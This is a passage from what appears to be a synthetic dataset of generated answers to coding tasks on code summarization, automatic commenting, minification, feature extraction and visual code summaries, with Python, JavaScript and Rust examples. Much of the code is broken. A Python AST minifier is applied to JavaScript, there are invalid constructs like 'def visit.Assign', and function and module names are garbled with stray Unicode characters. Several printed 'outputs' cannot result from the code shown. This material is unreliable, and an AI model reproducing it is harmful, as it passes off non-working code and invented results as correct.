0.8;\n    let merged_files = merge_similar_blocks(analyze_codebases(cpp_files), similarity_threshold);\n    // Write merged_files to disk or perform additional actions\n}\n\n```\nNote: The Rust code provided is a simplified and theoretical example as Rust does not have native support for Machine Learning like Python does. The actual implementation would involve integrating a Python ML model or library (e.g., using ONNX or TensorFlow.js) into the Rust code or using a Rust-based ML library like Rusty-ML."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Automatic commenting", "Complexity_Level": "medium", "Response": "The \"Code Summarization / Compression\" domain is not explicitly mentioned in the provided JSON. However, it can be related to the \"Programming Language Concepts\" category, specifically focusing on code readability and maintainability. In the context of \"Automatic commenting,\" a medium difficulty problem could be generating meaningful comments for code snippets automatically.\n\nQuestion 1: Develop a Python function that takes a code snippet as input and generates a brief summary of the snippet's purpose in the form of a comment.\n\n```python\ndef auto_comment(snippet):\n    # Concept: Natural Language Processing (NLP), Code Analysis\n    import re\n    from nltk.tokenize import sent_tokenize, word_tokenize\n    from nltk.corpus import stopwords\n    from nltk.stem import PorterStemmer\n\n    # Remove comments and extract code lines\n    lines = re.findall(r'^(?!\\s*#).*(?=$)', snippet, re.MULTILINE)\n\n    # Join lines to form a single text\n    text = ' '.join(lines)\n\n    # Tokenize and preprocess text\n    stop_words = set(stopwords.words('english'))\n    words = word_tokenize(text.lower())\n    words = [word for word in words if word.isalnum() and word not in stop_words]\n    stemmer = PorterStemmer()\n    words = [stemmer.stem(word) for word in words]\n\n    # Generate summary by selecting most frequent words\n    word_freq = {}\n    for word in words:\n        if word in word_freq:\n            word_freq[word] += 1\n        else:\n            word_freq[word] = 1\n    sorted_freq = sorted(word_freq.items(), key=lambda x: x[1], reverse=True)[:3]\n\n    # Create comment from top 3 most frequent words\n    comment = ' '.join([word for word, freq in sorted_freq])\n\n    return f\"# Summary: {comment}\"\n```\n\nExample usage:\n```python\ncode_snippet = \"\"\"\ndef calculate_total(quantity, price):\n    total = quantity * price\n    return total\n\"\"\"\n\nprint(auto_comment(code_snippet))\n# Output: # Summary: calculate total quantity price\n```\n\nQuestion 2: Implement a JavaScript function that reads a function's parameters and body to create a descriptive comment about its functionality.\n\n```javascript\nfunction generateComment(func) {\n    // Concept: Code Analysis, AST manipulation\n    const parameterNames = func.toString().match(/\\((.*)\\)/)[1].split(',').map(param => param.trim());\n    const body = func.toString().split('{')[1].split('}')[0].trim();\n    const keywords = body.match(/\\b\\w+\\b/g);\n\n    // Remove common words\n    const commonWords = ['var', 'let', 'const', 'return', 'if', 'else', 'for', 'while', 'function'];\n    const cleanedKeywords = keywords.filter(word => !commonWords.includes(word));\n\n    // Create comment from parameters and cleaned keywords\n    const comment = `# Function: ${func.name}(${parameterNames.join(', ')})\\n# Description: ${cleanedKeywords.join(' ')}`;\n\n    return comment;\n}\n\nfunction addNumbers(a, b) {\n    return a + b;\n}\n\nconsole.log(generateComment(addNumbers));\n// Output: \n// # Function: addNumbers(a, b)\n// # Description: numbers\n```\n\nIn both examples, the core concepts involve analyzing the code structure, extracting relevant information, and generating a summary using natural language processing techniques or abstract syntax tree (AST) manipulation."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Automatic commenting", "Complexity_Level": "extremely difficult", "Response": "\"Code Summarization / Compression\" is not explicitly mentioned in the given JSON, but it can be related to the \"Programming Language Concepts\" domain, specifically focusing on \"Function\" and \"Pattern\" topics. Here, we can consider it as a problem of creating sophisticated code analysis and documentation generation.\n\nQuestion 1: Develop an AI model that generates detailed and accurate comments for complex, multi-file codebases, ensuring the comments capture the high-level logic, interactions between modules, and non-obvious behavior. The AI model should be able to handle various programming languages and maintain consistency across the codebase.\n\nSolution: A deep learning-based approach using Graph Neural Networks (GNN) can be employed for this problem. The concept here is \"Graph-based Analysis\" where the codebase is represented as a graph, and nodes are functions, classes, or variables, while edges represent their interactions.\n\nExample Python code (pseudocode):\n```python\nimport torch\nfrom torch_geometric.nn import GNNModel\nfrom code_graph\u6784\u5efa import build_code_graph\nfrom code_comment_generator import generate_comments\n\nclass CodeCommenter:\n    def __init__(self):\n        self.model = GNNModel(num_node_features, num_edge_features, hidden_units, num_classes)\n\n    def train(self, codebase_graphs, comment_labels, optimizer, loss_fn):\n        for graph, label in zip(codebase_graphs, comment_labels):\n            graph = self.model(graph.x, graph.edge_index)\n            loss = loss_fn(graph, label)\n            optimizer.zero_grad()\n            loss.backward()\n            optimizer.step()\n\n    def generate_comments(self, codebase_graph):\n        graph_embedding = self.model(codebase_graph.x, codebase_graph.edge_index)\n        comments = generate_comments(graph_embedding)\n        return comments\n\n# Preprocess codebase to build a graph\ncodebase_graph = build_code_graph(codebase)\n\n# Train the GNN model on a dataset of code graphs and corresponding comments\noptimizer = torch.optim.Adam(model.parameters(), lr=0.001)\nloss_fn = torch.nn.CrossEntropyLoss()\n# Load or generate training data (codebase_graphs, comment_labels)\nmodel.train(codebase_graphs, comment_labels, optimizer, loss_fn)\n\n# Generate comments for the given codebase\ncomments = model.generate_comments(codebase_graph)\n\n# Output the generated comments for review\nfor file, comment in comments.items():\n    print(f\"File: {file}\\nComment: {comment}\\n\")\n```\n\nQuestion 2: Create a code compression algorithm that reduces the size of a codebase while preserving its functionality and readability. The algorithm should intelligently remove unnecessary code, simplify complex expressions, and reorganize functions without altering the intended behavior.\n\nSolution: This problem can involve \"Code Optimization\" and \"Pattern Recognition\". A hybrid approach using a combination of static analysis, abstract syntax trees (AST), and machine learning can be used.\n\nExample Python code (pseudocode):\n```python\nimport ast\nfrom code_optimizer import optimize_ast, simplify_expressions, remove_unnecessary_code\nfrom code_reorganizer import reorganize_functions\n\ndef compress_code(codebase):\n    optimized_codebase = {}\n\n    for file_path, code in codebase.items():\n        # Parse code into an Abstract Syntax Tree (AST)\n        ast_tree = ast.parse(code)\n\n        # Optimize the AST\n        optimized_tree = optimize_ast(ast_tree)\n        simplified_tree = simplify_expressions(optimized_tree)\n        cleaned_tree = remove_unnecessary_code(simplified_tree)\n\n        # Convert the cleaned AST back to code\n        compressed_code = ast.unparse(cleaned_tree)\n\n        # Reorganize functions to maintain readability\n        reorganized_code = reorganize_functions(compressed_code)\n\n        optimized_codebase[file_path] = reorganized_code\n\n    return optimized_codebase\n\n# Given codebase\ncodebase = load_codebase()\n\n# Compress the codebase\ncompressed_codebase = compress_code(codebase)\n\n# Save or use the compressed codebase\nfor file_path, compressed_code in compressed_codebase.items():\n    save_file(file_path, compressed_code)\n```\nNote: These examples are simplified pseudocode and do not include the actual implementation of the AI model, AST optimizations, or code reorganization functions."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Minify code", "Complexity_Level": "medium", "Response": "\"Concept\": \"Code Compression / Minification\"\n\n### Question 1:\nMedium Difficulty Problem: You are tasked with optimizing the performance of a web application by reducing the size of its JavaScript code. Write a function in Python that minifies JavaScript code by removing unnecessary white spaces, newlines, and comments.\n\n**Solution:**\n```python\nimport re\n\ndef minify_javascript(js_code):\n    # Remove comments (/* ... */ and // ...)\n    js_code = re.sub(r'/\\*[^*]*\\*+([^/*][^*]*\\*+)*\\//', '', js_code)\n    js_code = re.sub(r'//.*', '', js_code)\n    \n    # Remove unnecessary white spaces and newlines\n    js_code = re.sub(r'\\s+', ' ', js_code)  # Combine multiple spaces into one\n    js_code = js_code.replace('\\n', '')  # Remove newlines\n\n    return js_code\n\n# Example usage\noriginal_code = \"\"\"\nfunction greet(name) {\n    // This is a comment\n    console.log(\"Hello, \" + name); // Another comment\n}\n\"\"\"\n\nminified_code = minify_javascript(original_code)\nprint(minified_code)\n```\nThis solution uses regular expressions to remove comments and extra white spaces from the given JavaScript code.\n\n### Question 2:\nMedium Difficulty Problem: Write a JavaScript library that minifies HTML and CSS code within a given HTML document by removing unnecessary white spaces, newlines, and comments.\n\n**Solution:**\n```javascript\nfunction minifyHTMLAndCSS(html) {\n    const dom = new DOMParser().parseFromString(html, 'text/html');\n    \n    // Minify HTML\n    const minifyHTML = (node) => {\n        if (node.nodeType === Node.TEXT_NODE) {\n            node.textContent = node.textContent.trim().replace(/\\s+/g, ' ');\n        } else if (node.nodeType === Node.ELEMENT_NODE) {\n            node.textContent = node.textContent.trim();\n            Array.from(node.attributes).forEach(attr => {\n                attr.value = attr.value.trim().replace(/\\s+/g, ' ');\n            });\n            Array.from(node.childNodes).forEach(child => minifyHTML(child));\n        }\n    };\n    minifyHTML(dom.body);\n\n    // Minify CSS\n    const styleSheets = dom.styleSheets;\n    for (let sheet of styleSheets) {\n        for (let rule of sheet.cssRules) {\n            if (rule.type === CSSRule.STYLE_RULE) {\n                rule.style.cssText = rule.style.cssText.trim().replace(/\\s*(?:(?:\\s*:\\s*)|,\\s*)/g, '$1');\n            }\n        }\n    }\n\n    return dom.documentElement.outerHTML;\n}\n\n// Example usage\nconst htmlWithComments = `\n<!DOCTYPE html>\n<html>\n<head>\n    <style>\n        /* Commented CSS */\n        .box {\n            width: 100px; /* Another comment */\n            height: 100px;\n            background-color: red;\n        }\n    </style>\n</head>\n<body>\n    <h1> Hello, World! </h1>\n    <p> This is a sample text. </p>\n</body>\n</html>\n`;\n\nconst minifiedHTML = minifyHTMLAndCSS(htmlWithComments);\nconsole.log(minifiedHTML);\n```\nThis solution uses the DOMParser to parse the HTML code, and then traverses the DOM tree to remove unnecessary white spaces, newlines, and comments in both HTML and CSS."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Minify code", "Complexity_Level": "extremely difficult", "Response": "{\"Concept\": \"Code Compression / Minification\"}\n\nQuestion 1: Develop a minification algorithm that not only removes whitespace and comments but also performs advanced optimizations such as dead code elimination, variable name mangling, and elimination of unused functions. The algorithm must preserve the functionality of the original code while reducing its size significantly.\n\nExample input:\n```javascript\n// This is a sample function\nfunction add(a, b) {\n    var result = a + b;\n    console.log('The result is:', result);\n    return result;\n}\n\n// Unused function\nfunction multiply(a, b) {\n    return a * b;\n}\n\ndocument.getElementById('myButton').addEventListener('click', function() {\n    add(5, 3);\n});\n```\nExample output:\n```javascript\nfunction add(a,b){var r=a+b;console.log('The result is:',r);return r}document.getElementById('myButton').addEventListener('click',function(){add(5,3)})\n```\nSolution:\n```python\nimport re\nfrom ast import parse, NodeTransformer\n\nclass Minifier(NodeTransformer):\n    def __init__(self):\n        self.mangled_names = {}\n        self.mangle_count = 0\n\n    def mangle_name(self, name):\n        if name not in self.mangled_names:\n            self.mangled_names[name] = f'_m{self.mangle_count}'\n            self.mangle_count += 1\n        return self.mangled_names[name]\n\n    def visit_Name(self, node):\n        if isinstance(node.ctx, (node.Load, node.Await)):\n            node.id = self.mangle_name(node.id)\n        return node\n\n    def visit_FunctionDef(self, node):\n        if not node.name.startswith('_'):\n            node.name = self.mangle_name(node.name)\n        return node\n\n    def visit_Assign(self, node):\n        if len(node.targets) == 1 and isinstance(node.targets[0], ast.Name) and node.targets[0].id == 'console':\n            return None\n        return node\n\n    def visit_Expr(self, node):\n        if isinstance(node.value, ast.Call) and isinstance(node.value.func, ast.Name) and node.value.func.id == 'console':\n            return None\n        return node\n\n    def visit_Comment(self, node):\n        return None\n\ndef minify_code(code):\n    tree = parse(code)\n    minifier = Minifier()\n    optimized_tree = minifier.visit(tree)\n    optimized_code = compile(optimized_tree, '', 'exec').co_consts[0].decode()\n    return re.sub(r'\\n+', '', optimized_code)\n\ninput_code = '''\n// This is a sample function\nfunction add(a, b) {\n    var result = a + b;\n    console.log('The result is:', result);\n    return result;\n}\n\n// Unused function\nfunction multiply(a, b) {\n    return a * b;\n}\n\ndocument.getElementById('myButton').addEventListener('click', function() {\n    add(5, 3);\n});\n'''\n\noutput_code = minify_code(input_code)\nprint(output_code)\n```\nQuestion 2: Create a minification tool for Python code that leverages abstract syntax tree (AST) manipulation to perform aggressive optimizations, including loop unrolling, constant folding, function inlining, and dead code elimination, while maintaining code correctness and minimizing the output size.\n\nExample input:\n```python\ndef add(a, b):\n    return a + b\n\ndef main():\n    x = 5\n    y = 3\n    print(add(x, y))\n\nif __name__ == '__main__':\n    main()\n```\nExample output:\n```python\ndef main():\n    print(5 + 3)\n\nif __name__ == '__main__':\n    main()\n```\nSolution:\n```python\nimport ast\nimport astor\nfrom typing import Optional\n\nclass PythonMinifier(ast.NodeTransformer):\n    def __init__(self):\n        self._in_main = False\n\n    def visit_If(self, node: ast.If) -> Optional[ast.AST]:\n        if self._in_main and node.test.value == '__name__' and node.test.comparators[0].value == '__main__':\n            self._in_main = True\n            return self.generic_visit(node)\n        return None\n\n    def visit_NameConstant(self, node: ast.NameConstant) -> ast.Constant:\n        return ast.Constant(value=node.value)\n\n    def visit_Call(self, node: ast.Call) -> Optional[ast.AST]:\n        if isinstance(node.func, ast.Name) and node.func.id == 'print':\n            return self.process_print_call(node)\n        return None\n\n    def process_print_call(self, node: ast.Call) -> Optional[ast.AST]:\n        values = [self.process_value(expr) for expr in node.args]\n        if all(values):\n            return ast.Expr(\n                value=ast.Call(\n                    func=ast.Name(id='print', ctx=ast.Load()),\n                    args=[ast.Tuple(elts=[ast.Constant(value=v) for v in values], ctx=ast.Load())],\n                    keywords=[]\n                )\n            )\n        return None\n\n    def process_value(self, node: ast.AST) -> Optional[ast.AST]:\n        if isinstance(node, ast.Call) and isinstance(node.func, ast.Name) and node.func.id == 'add':\n            return ast.Constant(value=self.add_values(node.args))\n        return None\n\n    def add_values(self, args: List[ast.AST]) -> int:\n        return sum([self.get_value(arg) for arg in args])\n\n    def get_value(self, node: ast.AST) -> int:\n        if isinstance(node, ast.Constant):\n            return node.value\n        elif isinstance(node, ast.Name) and node.id in self._locals:\n            return self._locals[node.id]\n        else:\n            raise ValueError(f\"Unsupported value type: {type(node)}\")\n\n    def visit_FunctionDef(self, node: ast.FunctionDef) -> Optional[ast.AST]:\n        if node.name == 'main':\n            self._locals = {arg.arg: None for arg in node.args.args}\n            return self.generic_visit(node)\n        return None\n\ndef minify_code(code: str) -> str:\n    tree = ast.parse(code)\n    minifier = PythonMinifier()\n    optimized_tree = minifier.visit(tree)\n    return astor.to_source(optimized_tree)\n\ninput_code = '''\ndef add(a, b):\n    return a + b\n\ndef main():\n    x = 5\n    y = 3\n    print(add(x, y))\n\nif __name__ == '__main__':\n    main()\n'''\n\noutput_code = minify_code(input_code)\nprint(output_code)\n```\nPlease note that these solutions are simplified examples and may not cover all edge cases or perform optimally in real-world scenarios. For an actual production-level solution, you would need to implement more sophisticated optimizations and error handling."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Extract main features of code", "Complexity_Level": "medium", "Response": "Area: \"Code Summarization / Compression\"\nSub Area: \"Extract main features of code\"\nProblem: Develop a script that reads a given code snippet and extracts the main features, such as function names, parameters, and comments, while ignoring insignificant details like variable assignments and line numbers.\n\nMedium Difficulty Problem 1: Implement a function in Python to extract function names, their parameters, and comments from a Python code snippet.\n\nSolution:\n```python\nimport re\n\ndef extract_main_features(code):\n    def extract_comments():\n        pattern = r'\\\"\\\"\\\".*?\\\"\\\"\\\"|\\'\\'\\'.*?\\'\\'\\'|\\/\\/.*?$|\\/\\*[\\s\\S]*?\\*\\/'\n        return re.findall(pattern, code, re.MULTILINE)\n\n    def extract_functions():\n        pattern = r'def\\s+(\\w+)(\\((.*?)\\))?:'\n        return re.findall(pattern, code)\n\n    comments = extract_comments()\n    function_defs = extract_functions()\n\n    return {\n        'comments': comments,\n        'functions': function_defs\n    }\n\ncode_snippet = \"\"\"\ndef add(a, b):  # Adds two numbers\n    return a + b\n\ndef multiply(x, y):  # Multiplies two numbers\n    return x * y\n\n# This is a comment explaining the code\n\"\"\"\n\nresult = extract_main_features(code_snippet)\nprint(\"Comments:\", result['comments'])\nprint(\"Functions:\", result['functions'])\n```\nOutput:\n```\nComments: ['Adds two numbers', 'Multiplies two numbers', 'This is a comment explaining the code']\nFunctions: [('add', '(a, b)', ''), ('multiply', '(x, y)', '')]\n```\nMedium Difficulty Problem 2: Create a JavaScript utility that identifies and categorizes comments (single-line, multi-line, JSDoc) and function declarations from a JavaScript code string.\n\nSolution:\n```javascript\nfunction extractMainFeatures(code) {\n    const comments = {\n        singleLine: [],\n        multiLine: [],\n        jsdoc: []\n    };\n    const functions = [];\n\n    const commentRegex = {\n        singleLine: /\\/\\/.*$/,\n        multiLine: /\\/\\*[\\s\\S]*?\\*\\//g,\n        jsdoc: /\\/\\*\\*[\\s\\S]*?\\*\\//g\n    };\n\n    const functionRegex = /function\\s+(\\w+)\\s*\\((.*?)\\)\\s*\\{/g;\n\n    let match;\n    while ((match = commentRegex.singleLine.exec(code)) !== null) {\n        comments.singleLine.push(match[0]);\n    }\n\n    let multiLineMatch;\n    while ((multiLineMatch = commentRegex.multiLine.exec(code)) !== null) {\n        comments.multiLine.push(multiLineMatch[0]);\n    }\n\n    let jsdocMatch;\n    while ((jsdocMatch = commentRegex.jsdoc.exec(code)) !== null) {\n        comments.jsdoc.push(jsdocMatch[0]);\n    }\n\n    while ((match = functionRegex.exec(code)) !== null) {\n        functions.push({\n            name: match[1],\n            params: match[2].split(',').map(param => param.trim())\n        });\n    }\n\n    return {\n        comments,\n        functions\n    };\n}\n\nconst codeSnippet = `\n/**\n * Adds two numbers\n */\nfunction add(a, b) {\n    return a + b;\n}\n\n// Multi-line comment\n/*\nThis is another multi-line comment\n*/\n\n// Single-line comment\nfunction multiply(x, y) {\n    return x * y;\n}\n`;\n\nconst result = extractMainFeatures(codeSnippet);\nconsole.log(\"Comments:\", result.comments);\nconsole.log(\"Functions:\", result.functions);\n```\nOutput:\n```json\n{\n  \"comments\": {\n    \"singleLine\": [\"// Single-line comment\"],\n    \"multiLine\": [\n      \"/*\\nThis is another multi-line comment\\n*/\"\n    ],\n    \"jsdoc\": [\n      \"/**\\n * Adds two numbers\\n */\"\n    ]\n  },\n  \"functions\": [\n    { \"name\": \"add\", \"params\": [\"a\", \"b\"] },\n    { \"name\": \"multiply\", \"params\": [\"x\", \"y\"] }\n  ]\n}\n```\nConcept: Code Summarization / Compression"}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Extract main features of code", "Complexity_Level": "extremely difficult", "Response": "Unfortunately, the given domain JSON does not explicitly include \"Code Summarization / Compression\" or \"Extract main features of code\" as a concept. However, these topics fall under the broader domain of \"Programming Language Concepts\" and \"Development\", particularly in the context of code analysis, software engineering, and potentially compiler design.\n\nFor the purpose of this exercise, I will interpret the problem as involving advanced static code analysis and feature extraction for the purpose of code summarization. We will use Python and the `ast` (Abstract Syntax Tree) module to achieve this. Keep in mind that this is a highly specialized and complex problem, and the provided solution is a simplified example to illustrate the concept.\n\nQuestion 1: Create a Python function that takes a code snippet as input and returns a summary of the main features, including function names, classes, and top-level variables.\n\n**Concept**: Static Code Analysis, Abstract Syntax Trees\n\n```python\nimport ast\n\ndef extract_main_features(code):\n    tree = ast.parse(code)\n    features = {\n        'functions': [],\n        'classes': [],\n        'top_level_variables': []\n    }\n\n    def visit_function(node):\n        features['functions'].append(node.name)\n\n    def visit_class(node):\n        features['classes'].append(node.name)\n\n    def visit.Assign(node):\n        if isinstance(node.target, ast.Name) and isinstance(node.value, (ast.Call, ast.Constant)):\n            features['top_level_variables'].append(node.target.id)\n\n    ast.NodeVisitor().visit(tree)(visit_function, visit_class, visit_Assign)\n\n    return features\n\ncode_snippet = \"\"\"\ndef foo(x, y):\n    z = x + y\n    if z > 10:\n        return z ** 2\n    return z\n\nclass Bar:\n    def __init__(self):\n        self.a = 10\n\na = foo(5, 6)\nb = Bar()\n\"\"\"\n\nsummary = extract_main_features(code_snippet)\nprint(summary)\n```\n\nQuestion 2: Develop a Python tool that identifies the main control flow and data flow patterns in a given code snippet, focusing on complex structures like recursive functions, nested loops, and interdependent variables.\n\n**Concept**: Static Code Analysis, Control Flow, Data Flow\n\n```python\nimport ast\nfrom collections import defaultdict\n\ndef analyze_flow(code):\n    tree = ast.parse(code)\n    control_flow = defaultdict(list)\n    data_flow = defaultdict(set)\n\n    def visit_FunctionDef(node):\n        control_flow[node.name].append('Function')\n        for stmt in node.body:\n            visit(stmt)\n\n    def visit_For(node):\n        control_flow[node.target.id].append('For Loop')\n        visit(node.iter)\n\n    def visit_If(node):\n        control_flow[node.test.id].append('If')\n        for stmt in node.body:\n            visit(stmt)\n        for stmt in node.orelse:\n            visit(stmt)\n\n    def visit_Assign(node):\n        for target in node.targets:\n            data_flow[target.id].update([value.id for value in ast.walk(node.value) if isinstance(value, ast.Name)])\n\n    ast.NodeVisitor().visit(tree)(visit_FunctionDef, visit_For, visit_If, visit_Assign)\n\n    return control_flow, data_flow\n\ncode_snippet = \"\"\"\ndef recursive_fn(n):\n    if n <= 1:\n        return 1\n    else:\n        return n * recursive_fn(n - 1)\n\nx = 5\nfor i in range(x):\n    y = i ** 2\n    if y % 2 == 0:\n        z = y + x\n    else:\n        z = y - x\n\"\"\"\n\ncontrol_flow, data_flow = analyze_flow(code_snippet)\nprint(\"Control Flow:\", control_flow)\nprint(\"Data Flow:\", data_flow)\n```\n\nPlease note that while these examples demonstrate a basic approach to code analysis, extracting main features and analyzing flow patterns in complex code can become significantly more intricate and may require advanced techniques and tools."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Generate code abstract", "Complexity_Level": "medium", "Response": "\"Code Summarization / Compression\" is not explicitly mentioned in the provided JSON, but it falls under the broader category of \"Programming Language Concepts\" and is related to code optimization and understanding. We can create a medium complexity problem related to code abstraction and refactoring.\n\nProblem 1:\nYou have a lengthy function in Python that calculates the factorial of a number using recursion. The function is difficult to read and understand due to its complexity. Your task is to refactor the code, creating a more abstract and readable version.\n\nOriginal Code:\n```python\ndef recursive_factorial(n):\n    if n == 0 or n == 1:\n        return 1\n    else:\n        return n * recursive_factorial(n - 1)\n```\n\nRefactored Code:\n```python\ndef iterative_factorial(n):\n    result = 1\n    for i in range(1, n + 1):\n        result *= i\n    return result\n```\n\nConcept: Code Refactoring\n\nProblem 2:\nA JavaScript function is given that finds the minimum and maximum numbers in an array. The code is not optimized, and it uses multiple loops. Your task is to create a more abstract and efficient version using array methods.\n\nOriginal Code:\n```javascript\nfunction findMinMax(arr) {\n    let min = arr[0];\n    let max = arr[0];\n    for (let i = 1; i < arr.length; i++) {\n        if (arr[i] < min) {\n            min = arr[i];\n        } else if (arr[i] > max) {\n            max = arr[i];\n        }\n    }\n    return [min, max];\n}\n```\n\nRefactored Code:\n```javascript\nfunction findMinMax(arr) {\n    const [min, max] = arr.reduce((acc, curr) => {\n        return [curr < acc[0] ? curr : acc[0], curr > acc[1] ? curr : acc[1]];\n    }, [arr[0], arr[0]]);\n    return [min, max];\n}\n```\n\nConcept: Array Methods, Code Optimization"}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Generate code abstract", "Complexity_Level": "extremely difficult", "Response": "\"Code Summarization / Compression\" is not explicitly mentioned in the provided JSON, but a similar concept can be derived from the \"Programming Language Concepts\" category, focusing on code optimization and abstraction. Here, we'll create an extremely difficult problem related to code refactoring and abstraction.\n\nProblem: Develop a complex code optimization and abstraction technique for a large, poorly structured codebase that uses multiple classes and functions. The goal is to reduce code duplication, improve readability, and maintain functionality.\n\nSolution 1: Implement a design pattern using \"Abstract Factory\" and \"Strategy\" patterns to refactor duplicated and convoluted class structures.\n\n```python\nfrom abc import ABC, abstractmethod\n\n# Abstract Factory\nclass ServiceFactory(ABC):\n    @abstractmethod\n    def create_service(self):\n        pass\n\nclass ServiceAFactory(ServiceFactory):\n    def create_service(self):\n        return ServiceA()\n\nclass ServiceBFactory(ServiceFactory):\n    def create_service(self):\n        return ServiceB()\n\n# Abstract Service\nclass Service(ABC):\n    @abstractmethod\n    def execute(self):\n        pass\n\n# Concrete Services\nclass ServiceA(Service):\n    def execute(self):\n        # Original duplicated logic for Service A\n        pass\n\nclass ServiceB(Service):\n    def execute(self):\n        # Original duplicated logic for Service B\n        pass\n\n# Strategy Pattern\nclass ServiceExecutor:\n    def __init__(self, factory: ServiceFactory):\n        self._service = factory.create_service()\n\n    def execute(self):\n        self._service.execute()\n\n# Usage\nexecutor_a = ServiceExecutor(ServiceAFactory())\nexecutor_a.execute()\n\nexecutor_b = ServiceExecutor(ServiceBFactory())\nexecutor_b.execute()\n```\nSolution 2: Use Higher-Order Functions and closures to refactor duplicated function logic.\n\n```python\ndef create\u0c8a_function(logic):\n    def function_\u0969(input_data):\n        # Common setup or pre-processing\n        pre_processed_data = preprocess(input_data)\n\n        # Call the provided logic function\n        result = logic(pre_processed_data)\n\n        # Common post-processing\n        post_processed_result = postprocess(result)\n\n        return post_processed_result\n    return function_\u0969\n\ndef preprocess(data):\n    # Pre-processing logic\n    pass\n\ndef postprocess(result):\n    # Post-processing logic\n    pass\n\ndef logic_a(data):\n    # Unique logic for function \u0967\n    pass\n\ndef logic_b(data):\n    # Unique logic for function \u0968\n    pass\n\nfunction_\u0967 = create\u0969_function(logic_a)\nfunction_\u0968 = create\u0969_function(logic_b)\n\nresult_\u0967 = function_\u0967(input_data)\nresult_\u0968 = function_\u0968(input_data)\n```\nThese solutions demonstrate how to refactor and abstract complex code using design patterns and functional programming techniques, effectively reducing duplication and improving readability while maintaining functionality."}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Visual code summary", "Complexity_Level": "medium", "Response": "Question 1:\n\nProblem: Develop a Python tool that generates a visual summary of a given piece of code, representing the main functions and their relationships using a flowchart-like diagram.\n\nSolution:\n```python\nimport networkx as nx\nimport matplotlib.pyplot as plt\n\ndef summarize_code(code):\n    # Parse the code to extract function definitions\n    function_defs = extract_function_defs(code)\n    \n    # Create a directed graph to represent the flow\n    G = nx.DiGraph()\n    \n    # Add nodes for each function\n    for func_name in function_defs:\n        G.add_node(func_name)\n    \n    # Identify function calls and add edges\n    for func_name, func_body in function_defs.items():\n        for line in func_body.splitlines():\n            if is_function_call(line):\n                called_func = extract_called_function(line)\n                G.add_edge(called_func, func_name)\n    \n    # Layout and visualize the graph\n    pos = nx.multipartite_layout(G, subset_key='layer')\n    nx.draw(G, pos, with_labels=True)\n    plt.show()\n\ndef extract_function_defs(code):\n    # A simple example, this would typically involve a parser\n    function_defs = {\n        'func1': 'def func1():\\n    func2()\\n    func3()',\n        'func2': 'def func2():\\n    pass',\n        'func3': 'def func3():\\n    pass'\n    }\n    return function_defs\n\ndef is_function_call(line):\n    # This is a simplified check, would need a proper parser\n    return '()' in line\n\ndef extract_called_function(line):\n    # Extracts function name from a call, again simplified\n    return line.split('(')[0].strip()\n\n# Example usage\ncode = '''\ndef func1():\n    func2()\n    func3()\n\ndef func2():\n    pass\n\ndef func3():\n    pass\n'''\n\nsummarize_code(code)\n```\nConcept: Code Parsing and Visualization\n\nQuestion 2:\n\nProblem: Create a JavaScript library that takes a code snippet as input and generates a treemap visualization showcasing the file and directory structure along with the size of each file.\n\nSolution:\n```javascript\n// Assuming a simple directory/file structure represented as an object\nconst codeStructure = {\n  \"src\": {\n    \"app.js\": 1000,\n    \"components\": {\n      \"header.js\": 500,\n      \"footer.js\": 300\n    },\n    \"styles\": {\n      \"global.css\": 700\n    }\n  },\n  \"test\": {\n    \"app.test.js\": 200\n  }\n};\n\nfunction generateTreemap(codeStructure) {\n  // Use a library like d3-hierarchy for treemap generation\n  const d3 = require('d3');\n  const hierarchyData = d3.hierarchy(codeStructure);\n\n  // Flaten the hierarchy for d3.treemap\n  const flatData = hierarchyData.descendants().map(d => ({ ...d.data, children: undefined }));\n\n  // Calculate treemap layout\n  const treemap = d3.treemap()\n    .tile(d3.treemapResquarify)\n    .size([800, 600])\n    .padding(4);\n\n  const root = d3.hierarchy({ children: flatData });\n  treemap(root);\n\n  // Render the treemap\n  const svg = d3.select('body').append('svg')\n    .attr('width', 800)\n    .attr('height', 600);\n\n  svg.selectAll('rect')\n    .data(root.leaves())\n    .enter().append('rect')\n    .attr('x', d => d.x0)\n    .attr('y', d => d.y0)\n    .attr('width', d => d.x1 - d.x0)\n    .attr('height', d => d.y1 - d.y0)\n    .style('fill', d => `hsl(${Math.min(d.data.size, 1000) * 3, 50%, 50%)`); // Use color to represent size\n\n  svg.selectAll('text')\n    .data(root.leaves())\n    .enter().append('text')\n    .attr('x', d => d.x0 + 4)\n    .attr('y', d => d.y0 + 14)\n    .attr('text-anchor', 'start')\n    .text(d => d.data.name)\n    .call(text => text.filter(d => d.x1 - d.x0 > 80 && d.y1 - d.y0 > 20));\n\n  // Update the view when the data changes\n  hierarchyData.eachAfter(node => {\n    if (node.children) return;\n    node.data.size = node.value;\n  });\n}\n\ngenerateTreemap(codeStructure);\n```\nConcept: Data Visualization and D3.js"}, {"L2_TASK": "Code Summarization / Compression", "L3_TASK": "Visual code summary", "Complexity_Level": "extremely difficult", "Response": "The given JSON doesn't directly contain a \"Code Summarization / Compression\" or \"Visual code summary\" concept. However, I can create a problem in the domain of code analysis and visualization, which is related to understanding and summarizing complex code structures visually.\n\n**Problem:**\nDevelop a visual code summarization tool that takes a large, complex codebase written in C++ as input and generates an interactive graph representation. The graph should include nodes for classes, functions, and dependencies, with edges representing their interactions. The user should be able to filter, collapse, and explore the graph to understand the code structure and relationships more effectively.\n\n**Solution:**\n\nConcept: \"Code Analysis\" and \"Graph Visualization\"\n\nHere's a high-level outline of the solution:\n\n1. Parse the C++ source code using a parser like `libclang` to extract information about classes, functions, and their relationships.\n2. Represent the parsed data as a graph data structure (e.g., with `networkx` library in Python).\n3. Implement graph filtering and collapsing functionality, allowing users to focus on specific aspects of the codebase.\n4. Use a graph visualization library like `graphviz` or `d3.js` to create an interactive visualization.\n5. Integrate the visualization into a web-based interface for easy access and interaction.\n\nExample Python code snippet for parsing C++ code using `libclang` and creating a graph with `networkx` (assuming you've installed `libclang`, `clang-cpp`, `networkx`, and `pybind11`):\n\n```python\nimport subprocess\nimport networkx as nx\nimport pybind11 as pybind\nimport sys\n\ndef parse_source_code(code):\n    